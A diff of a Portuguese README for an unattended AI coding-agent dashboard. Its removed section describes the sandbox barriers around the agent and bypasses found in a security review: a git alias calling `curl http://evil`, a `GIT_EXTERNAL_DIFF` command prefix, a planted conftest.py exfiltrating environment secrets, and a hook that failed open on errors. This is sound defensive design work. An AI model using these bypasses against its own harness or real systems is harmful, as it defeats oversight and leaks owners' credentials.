-sinônimo de "o dado é confiável". Recalcular só descarta o que o *navegador*
-mandou. O que veio da internet e foi guardado continua vindo da internet.
-
-### O que este recurso NÃO isola
-
-`Bash` está na lista branca e **não** fica preso à cópia: o shell não conhece
-fronteira de pasta. `Bash` fica porque sem ele a sessão não roda teste nem
-commita — e aí o recurso não existe.
-
-Enquanto havia uma pessoa olhando a tela, isso era um risco vigiado. A fila
-(`fila.py`) roda **desacompanhada**, e um risco sem vigia é outro risco. Quatro
-barreiras foram postas em 25/08/2026, em ordem de importância:
-
-1. **A cópia não alcança o GitHub.** Ela era um `git worktree`, que compartilha
-   o `.git` do projeto de verdade e, com ele, o `origin` já autenticado: um
-   `git push --force` saído de lá chegava ao repositório real. Passou a ser um
-   `git clone --no-hardlinks` com o `origin` removido e `core.hooksPath` numa
-   pasta vazia. Custa disco e meio segundo (medido: 0,5 s neste repositório; o
-   maior dos 17 tem 342 MB de `.git`) e paga com uma propriedade que nenhuma
-   lista de comandos daria — dali não há caminho até o GitHub. Quem atravessa
-   essa ponte é o painel, depois, com o diff já aprovado pelas travas.
-2. **A sessão filha não carrega configuração de arquivo nenhum.**
-   `--setting-sources ""` corta tudo o que vem de arquivo, e o `--settings`
-   explicito sobrevive ao corte (medido em 25/08/2026, `claude` 2.1.245 — a
-   versão anterior deste README dizia que só `--bare` isolaria, e estava
-   errado). Some o `~/.claude` do dono, que rodava seis hooks `SessionStart`
-   dentro da filha; e some o `.claude/settings.json` **do repositório sendo
-   consertado**, que é conteúdo escrito por estranho e podia definir hook
-   próprio. Este segundo era o furo que ninguém tinha visto.
-3. **Todo comando passa por uma lista antes de rodar** (`barreira.py`, um hook
-   `PreToolUse`). Medido numa sessão de verdade em 25/08/2026, por US$ 0,33:
-   `git push origin main` e `curl http://example.com` **barrados** com a frase
-   em português; `git status --porcelain` rodou. Lista branca de programas, nada que vire
-   interpretador de texto solto (`python -c`, `node -e`, `bash -c`), nenhum
-   caminho absoluto ou com `..`, e `.git/` intocável. Recusa sai com código 2
-   e a frase em português chega à sessão.
-
-   **O `git` tem lista BRANCA de subcomando, e a razão é um furo medido.** A
-   revisão de segurança de 25/08/2026 encontrou, e a medição confirmou, que
-   `git -c alias.pwn='!curl http://evil' pwn` passava **liberado** pela lista
-   negra: o git executa o valor do alias por um shell que a barreira nunca
-   leria, e de dentro dele `git remote add` mais `git push` alcançavam o
-   GitHub com a credencial do dono. A mesma porta existia em `core.pager`,
-   `core.fsmonitor`, `diff.external` e `--exec-path`. Lista negra de `git`
-   sempre perde: cada versão inventa capacidade nova, e a lista só protege o
-   que já conhece.
-
-   Da mesma revisão, três furos da mesma família: prefixo `NOME=valor` antes
-   do comando (`GIT_EXTERNAL_DIFF=x git diff` rodava `x`), caminho relativo
-   ao drive do Windows (`C:segredo.txt` escapava do teste de caminho
-   absoluto, que exigia a barra) e — o pior — **bug na barreira abria a
-   porta**: só o código 2 barra, e exceção não tratada saía com código 1, que
-   o Claude Code trata como liberado. `decidir` é um interpretador de linha
-   de comando escrito à mão; ele *vai* ter bug. Agora qualquer exceção
-   vira código 2.
-
-4. **A sessão não recebe segredo do ambiente** (`execucao.ambiente_da_filha`).
-   O `Popen` da filha não passava `env=`, então ela herdava o ambiente inteiro
-   do painel. Como a sessão é instruída a rodar a suíte do projeto-alvo, um
-   `conftest.py` plantado lê `os.environ` e manda tudo embora por socket — e a
-   barreira barra `curl` pelo **nome**, não contém rede. `GH_TOKEN` e
-   `GITHUB_TOKEN` são os que mais importam: com eles a sessão alcança o GitHub
-   sem precisar de `git push` nenhum. `ANTHROPIC_API_KEY` vai junto de
-   propósito, porque sem ela a sessão não roda — está escrito no código e tem
-   teste, para ninguém descobrir por acidente.
-
-**E o que continua não sendo isolado, dito sem enfeite:** rodar teste É rodar
-código arbitrário — a suíte do projeto é código de terceiro executando com todos
-os poderes do usuário desta máquina. A barreira encarece e estreita o caminho;
-ela não transforma a máquina num cofre. Não há isolamento de rede: o Claude Code
-desta versão não tem modo `sandbox` no Windows, e uma cerca de firewall por
-processo exigiria administrador. O que impede o estrago de **sair da cópia** são
-as barreiras 1 e 2; a 3 é o que impede o caminho fácil.
-
-**Consequência prática, e ela incomoda:** `npm install`, `pip install` e afins
-estão barrados. Um item de `dependencia_insegura` num projeto JavaScript que
-precise baixar dependência vai **falhar com motivo claro** em vez de baixar
-pacote sem ninguém olhando. É a troca escolhida; afrouxar depois é mais fácil
-que o contrário.
 
 ## A memória do tempo — o painel passa a lembrar de ontem
 
@@ -838,10 +481,8 @@ vale a troca.
 
 **É uma visão, não um substituto.** O `/api/dados` continua mandando a lista
 achatada em `pendencias`, e o agrupamento vai à parte, em `grupos`. O motivo é
-concreto: o botão "Resolver" recalcula a pendência pelo `id` no servidor — e é
-isso que mantém o prompt fechado a texto de estranho — e o "×" de esconder por
-24 h também é por `id`. Trocar o formato de `pendencias` quebraria os dois. Aqui
-muda o desenho; a identidade não muda.
+concreto: o "×" de esconder por 24 h acha a pendência pelo `id`. Trocar o
+formato de `pendencias` o quebraria. Aqui muda o desenho; a identidade não muda.
 
 O grupo é um `<details>` de verdade, não um painel escrito à mão: o **Ctrl+F do
 navegador acha o que está lá dentro** sem o dono precisar abrir.
@@ -999,3 +640,8 @@ Fases 3 e 4 da especificação (a **fase 2 está entregue**, seção acima) (`~/
   (`Ctrl+K`)**.
 - **Fase 4** — o `radar.py` do `~/.claude` passa a ler este banco em vez de
   coletar por conta própria, acabando com os dois coletores.
+
+E, desde 26/08/2026, o roteiro do **DERVS** (`docs/superpowers/plans/dervs-fatia-1.md`):
+banco multiusuário, login com segundo fator, e as telas refeitas. As etapas 13 a
+15 são as telas — é lá que se decide o que volta a existir como botão, e por
+qual caminho, agora que o servidor não executa mais nada.
